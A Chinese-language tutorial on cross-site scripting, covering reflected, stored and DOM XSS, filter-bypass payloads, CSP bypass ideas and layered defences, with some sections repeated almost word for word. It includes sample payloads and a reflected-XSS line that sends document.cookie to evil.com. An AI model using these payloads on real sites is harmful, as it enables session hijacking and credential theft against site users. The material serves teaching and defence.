---
title: XSS 跨站脚本：在别人浏览器里跑你的 JS
description: 讲清 XSS 的原理与危害，覆盖反射型、存储型、DOM 型三类，以及 XSS 平台、常见绕过与输入转义/CSP 等防御手段。
category: security
subcategory: pentest
tags: ['XSS', '跨站脚本', '前端安全', 'CSP']
pubDate: 2026-07-18
order: 5
---

如果说 SQLi 是"把数据当 SQL 执行"，那 **XSS（跨站脚本）** 就是"把数据当 **JavaScript** 执行"——只不过这次代码跑在**受害者的浏览器**里，而不是服务器上。它能偷 cookie、劫持会话、钓鱼、甚至蠕虫传播。

> 以下仅在授权靶场（如 DVWA、XSS 挑战平台）练习；对他人站点注入脚本属违法。

## 原理：被信任的"数据"变成了"代码"

看一段有洞的前端（PHP 伪代码）：

```php
<h1>搜索：<?php echo $_GET['q']; ?></h1>
```

用户输入 `?q=<script>alert(1)</script>`，页面变成：

```html
<h1>搜索：<script>alert(1)</script></h1>
```

浏览器看到 `<script>` 就**执行**了。用户输入本该是"数据"，却被当成了"代码"——这和 SQLi 同根同源，区别只在执行环境是浏览器。

## 危害：在受害者浏览器里为所欲为

XSS 的破坏力来自"代码在受害者身份下运行"：

- **偷 Cookie/Session**：`document.cookie` 发到攻击者服务器，进而劫持登录态；
- **钓鱼**：篡改页面插入假登录框，骗密码；
- **蠕虫**：自动关注、发帖、私信，自我传播（如历史著名的 Samy 蠕虫）；
- **键盘记录 / 截屏**：配合 JS API 监听输入；
- **内网探测**：用受害者浏览器当跳板扫他所在内网。

只要能跑 JS，受害者的浏览器能力你基本都能借用。

## 三类 XSS 的区别

**1. 反射型（Reflected XSS）**

恶意脚本**藏在 URL 里**，服务器"原样返回"到页面，用户点了这个链接才触发。不存储，靠骗人点链接。

```html
https://target.com/search?q=<script>alert(1)</script>
```

**2. 存储型（Stored XSS）**

恶意脚本**存进数据库**（比如评论、昵称、留言板），之后每个访问该页面的用户都会中招。**危害最大**，因为无需诱骗、自动发作、影响所有访客。

**3. DOM 型（DOM XSS）**

漏洞在前端 JS 里：脚本从 `location`、`document.write`、`innerHTML` 等取数据，没过滤就塞进 DOM。这种**服务器响应里看不到恶意代码**，是纯前端问题，审查源码才能发现。

> 记忆法：反射=藏在链接、存储=存在数据库、DOM=前端自己作死。

## 找 XSS 的基本思路

1. 找"用户输入会回显到页面"的地方：搜索框、评论、昵称、URL 参数；
2. 输入一个特殊标记如 `<svg>` 或 `"><`，看它是否原样出现在 HTML 里、有没有被过滤；
3. 尝试闭合标签、插入 `<script>` 或事件处理器如 `<img src=x onerror=alert(1)>`；
4. 测试不同上下文：在标签属性里、在 JS 字符串里、在 CSS 里，绕过方式不同。

## 常见绕过技巧（靶场向）

防御常过滤 `<script>`，于是攻击者换姿势：

- **事件处理器**：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`；
- **大小写混写**：`<ScRiPt>`（部分老旧过滤失效）；
- **嵌套/拆分**：`<scr<script>ipt>`（过滤器删掉中间后反而拼成 script）；
- **编码绕过**：HTML 实体、URL 编码、JS 十六进制；
- **换标签**：`<iframe>`、`<video>`、`<details ontoggle>` 等。

这些都是"猫鼠游戏"，理解思路比背 payload 重要。

## XSS 平台：把危害"工程化"

实战中偷 cookie 不会弹框，而是把数据发到攻击者服务器。XSS 平台（如开源的 XSSPlatform）提供一段"收数据的 JS"，你注入后，受害者 cookie、键盘记录就被悄悄回传。这再次强调：**只在自己靶场体验流程，绝不对他人使用。**

## 防御：多层设防

XSS 防御是"组合拳"，没有银弹：

**1. 输出编码（最基础）**

根据输出位置做不同编码：

- 进 HTML 正文 → HTML 实体编码（`&` → `&amp;`、`<` → `&lt;`）；
- 进 HTML 属性 → 属性编码，且属性值加引号；
- 进 JS → JS 编码，避免破坏字符串；
- 进 URL → URL 编码。

各模板引擎（如 Vue、React、Django、Thymeleaf）默认会对插值做 HTML 转义，别用"不转义"的 API（如 Vue 的 `v-html`、React 的 `dangerouslySetInnerHTML`）处理用户数据。

**2. 输入校验**

白名单限制：评论只允许中文英文数字、长度限制、过滤 `<>` 等危险字符。注意输入校验只是辅助，因为同一份数据可能出现在多种上下文。

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` 让 JS **读不到**这个 cookie，即使有 XSS 也偷不走会话（但仍可能用 JS 发请求，所以不是万能）。

**4. CSP（内容安全策略）**

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP 限制"哪些来源的脚本能执行"，即使注入成功，外部/内联脚本也可能被拦。它是 XSS 的强力兜底。

**5. WAF / 框架防护**

现代框架和安全中间件提供默认防护，但仍要以"正确编码"为根本。


## 更多实战案例：反射型 XSS 的钓鱼链

攻击者把恶意链接 `https://site.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>` 发给受害者，受害者一点，脚本在他浏览器里执行，把 cookie 发到攻击者服务器。由于链接指向的是"真实域名"，受害者容易信任。反射型不存储，靠诱导点击；常出现在搜索框、错误页、跳转参数等"把参数回显到页面"的地方。

## 更多实战案例：存储型 XSS 与 DOM 型

存储型最危险：攻击者在评论区、昵称、留言里提交 `<script>...` 或 `<img src=x onerror=...>`，服务器存进数据库，之后每个访问该页面的用户都会中招——这就是"蠕虫"式传播（如当年微博、MySpace 蠕虫）。DOM 型则完全在前端：页面用 `document.write(location.hash)` 或 `eval(location.search)` 把 URL 片段写进 DOM，攻击靠构造 `#<img src=x onerror=alert(1)>`，后端完全没参与，传统扫描器难发现。

## 更多实战案例：绕过滤的常用手法

当站点过滤 `<script>` 时，攻击者换标签：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<a href=javascript:alert(1)>`；过滤 `onerror` 用大小写混写 `OnErRoR`、换行、或事件拼接；过滤 `javascript:` 用 `JavAscript:` 或编码；还可用 `<iframe>`、`<details ontoggle>` 等冷门标签。编码绕过：`&#x3c;script&#x3e;` 用 HTML 实体，或 URL 编码，看过滤发生在哪一层。

## 常见坑

1. **只转义尖括号**：攻击者用 `onerror` 等事件属性，不需要尖括号也能执行。
2. **前端过滤后端不过滤**：前端删掉脚本只是障眼法，抓包改回来照样注入。
3. **innerHTML 拼接用户输入**：这是 DOM XSS 高发点，应用 textContent。
4. **以为 HttpOnly 就万事大吉**：HttpOnly 防不了"篡改页面/钓鱼/蠕虫"，只是保护 cookie 不被读。

## 进阶：修复

输出到 HTML 时用 **HTML 实体编码**（`<` 变 `&lt;`）；输出到属性里额外编码引号；JS 上下文用 `JSON.stringify` 并转义；设置 **CSP（内容安全策略）** 限制脚本来源，`script-src 'self'` 能挡掉绝大多数外链脚本；给 cookie 加 `HttpOnly` + `Secure` + `SameSite`；用现代框架（React/Vue）的自动转义，但切记别用 `v-html`/`dangerouslySetInnerHTML` 渲染用户输入。

## 小测验

- 问题1：存储型和反射型最大区别？答案：存储型存进数据库，所有访问者中招；反射型靠诱导点击单次触发。
- 问题2：DOM 型 XSS 后端参与吗？答案：不参与，完全在前端拼接 URL 片段到 DOM。
- 问题3：CSP 的 script-src 'self' 作用？答案：只允许同源脚本，挡掉外链恶意脚本。



## 更多实战案例：CSP 的配置与绕过思路

CSP 通过 `Content-Security-Policy` 头限制资源来源：`script-src 'self'` 只允许同源脚本，`'unsafe-inline'` 允许内联（不安全，等于放开 XSS）。配置时要避免 `'unsafe-inline'` 和 `*`；用 nonce 或 hash 给可信内联脚本放行。绕过思路：若允许 `unsafe-inline` 则直接内联；若允许某 CDN 且 CDN 有 JSONP 接口可回显脚本，则可借 CDN 执行；若只限制 script-src 没限制 base-uri，可用 `<base>` 劫持相对路径脚本。CSP 是强缓解但配置要严谨。

## 常见坑（终补）

1. **只转义尖括号**：攻击者用 onerror 等事件属性不需尖括号也能执行。
2. **前端过滤后端不过滤**：前端删脚本是障眼法，抓包改回照样注入。
3. **innerHTML 拼接用户输入**：DOM XSS 高发点，应用 textContent。
4. **以为 HttpOnly 就万事大吉**：HttpOnly 只防读 cookie，不防篡改页面。

## 进阶（终补）：修复

输出到 HTML 用 HTML 实体编码；输出到属性额外编码引号；JS 上下文用 JSON.stringify 并转义；设 CSP 限制脚本来源；cookie 加 HttpOnly+Secure+SameSite；用现代框架自动转义，但别用 v-html/dangerouslySetInnerHTML 渲染用户输入。输出编码 + CSP 双保险。

## 小测验（终补）

- 问题1：存储型和反射型最大区别？答案：存储型存库，所有访问者中招；反射型靠诱导点击单次触发。
- 问题2：DOM 型 XSS 后端参与吗？答案：不参与，完全前端拼接 URL 片段到 DOM。
- 问题3：CSP 的 script-src 'self' 作用？答案：只允许同源脚本，挡掉外链恶意脚本。



## 延伸思考：XSS 的防御层次

XSS 防御是分层的：第一层输入校验（限制长度、格式、字符集），拦掉明显恶意；第二层输出编码（按上下文 HTML/属性/JS/URL 分别编码），让输入变纯数据；第三层 CSP 限制脚本来源，即便漏了也难执行外链；第四层 cookie 加 HttpOnly 防窃取。四层叠加，XSS 基本无计可施。只做一层都不够稳。

## 一句话自测

- 为什么只转义尖括号不够？答：onerror 等事件属性不需尖括号也能执行。
- XSS 防御为什么要多层？答：单层都可能被绕过，输入校验+输出编码+CSP+HttpOnly 才稳。


## 这一篇你该记住的

XSS 是"用户输入被当 JS 在受害者浏览器执行"，分反射型（藏 URL）、存储型（存数据库，危害最大）、DOM 型（前端取数据未过滤）。危害包括偷 cookie、钓鱼、蠕虫。绕过靠事件处理器、编码、换标签等。防御是组合拳：输出编码（按上下文）、输入白名单、HttpOnly Cookie、CSP、正确用框架 API。

XSS 借的是"受害者浏览器"。下一篇 **CSRF** 更诡异：攻击者连 cookie 都不用拿，只要"骗已登录的浏览器替你发请求"就行——比如悄悄用你网银身份转账。
